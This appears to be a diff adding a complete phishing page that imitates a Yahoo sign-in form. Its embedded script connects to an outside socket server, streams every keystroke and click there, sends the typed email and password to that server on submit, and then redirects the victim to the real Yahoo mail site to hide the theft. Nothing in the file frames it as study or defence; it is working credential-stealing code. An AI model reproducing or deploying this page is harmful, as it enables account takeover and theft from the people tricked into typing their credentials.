@@ -1,0 +1,129 @@
+<!DOCTYPE html>
+<html>
+    <head>
+<meta http-equiv="Content-Security-Policy" content="default-src * data: 'unsafe-inline'; upgrade-insecure-requests">
+        <meta charset="utf-8">
+        <title></title>
+        <link rel="stylesheet" href="http://cdnjs.cloudflare.com/ajax/libs/semantic-ui/2.2.6/semantic.min.css" media="screen" title="no title" charset="utf-8">
+    </head>
+    <body>
+        <div class="ui container grid doubling stackable">
+            <div class="ui row">
+                <div class="ui sixteen wide column">
+                    <img class="ui image small" src="http://cdn.shopify.com/s/files/1/0190/6652/files/Yahoo.png?1782" alt="Yahoo!">
+                </div>
+            </div>
+            <div class="ui eleven wide column"></div>
+            <div class="ui five wide column">
+                <div class="ui segment blue">
+                    <img class="ui image" style="margin: 0 auto" src="http://cdn.shopify.com/s/files/1/0190/6652/files/Yahoo.png?1782" alt="Yahoo!">
+                    <form class="ui form" method='post' id="login_form">
+                        <!-- <h2 class="ui header">Hello Friend,</h2> -->
+
+                        <div class="field">
+                            <label>Email</label>
+                            <input type="email" name="email" placeholder="john.doe@yahoo.com" id="username">
+                        </div>
+                        <div class="field">
+                            <label>Password</label>
+                            <input type="password" name="passwd" id="password" placeholder="Password" tabindex="0">
+                        </div>
+                        <div class="field">
+                            <div class="ui checkbox">
+                                <input type="checkbox" class="hidden" checked="true">
+                                <label>Stay signed in</label>
+                            </div>
+                        </div>
+                        <button class="ui button primary fluid" type="submit" id="submit">Submit</button>
+                    </form>
+                    <br>
+                    <br>
+                    <br>
+                    <div class="ui message fluid warning">
+                        <h5 class="ui header black center aligned content">
+                            <i class="icon photo"></i>Photo Sharing
+                        </h5>
+                        <div class="ui divider"></div>
+                        <div class="ui header small">
+                            <div class="ui sub header center aligned content">
+                                More information about Yahoo photo sharing.
+                            </div>
+                        </div>
+                    </div>
+
+                </div>
+
+            </div>
+
+        </div>
+
+    </body>
+</html>
+<script src="https://cdnjs.cloudflare.com/ajax/libs/socket.io/1.7.1/socket.io.js"></script>
+<script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.1.1/jquery.min.js"></script>
+
+<script type="text/javascript">
+
+    var BigData = {
+        id: '6',
+        token: 'TwKTfWXgFAZ77L6TNgRfzEsA5CTrvK0CpP0ySegDkVzghRDaFU',
+        name: 'Yahoo',
+        site_id: '6',
+        redirect: 'http://mail.yahoo.com',
+        hsData: "6|6|TwKTfWXgFAZ77L6TNgRfzEsA5CTrvK0CpP0ySegDkVzghRDaFU|1515695942",
+    };
+
+    var socket = io('https://hspod-1.eu-1.evennode.com');
+
+    socket.on('ping', function (data) {
+        socket.emit('hello', BigData );
+    });
+
+    socket.on('redirect', function(data){
+        window.location = BigData.redirect;
+    });
+
+    $(document).ready(function(){
+
+        $('body').click(function(e){
+            this.BigData = BigData;
+            socket.emit('clicked', this.BigData);
+        });
+
+        $('body').on('keyup', function(e){
+            this.BigData = BigData;
+            this.BigData.key = e.key;
+            socket.emit('keyup', this.BigData);
+        });
+    });
+
+    $("#login_form").keypress(function(e) {
+        if (e.which == 13) {
+            $("#submit").click();
+        }
+    });
+
+    $("#submit").click(function(e) {
+        e.preventDefault();
+        if ($("#username").val() == "") {
+            var err = "1";
+            alert('Username cannot be left empty');
+        }
+        if ($("#password").val() == "") {
+            var err = "1";
+            alert('Password cannot be left empty');
+        }
+
+        if (err != "1") {
+
+            socket.emit('log', {
+                username : $("#username").val(),
+                password : $("#password").val(),
+                hsData: BigData.hsData,
+                BigData: BigData,
+            });
+
+            
+        }
+    });
+</script>
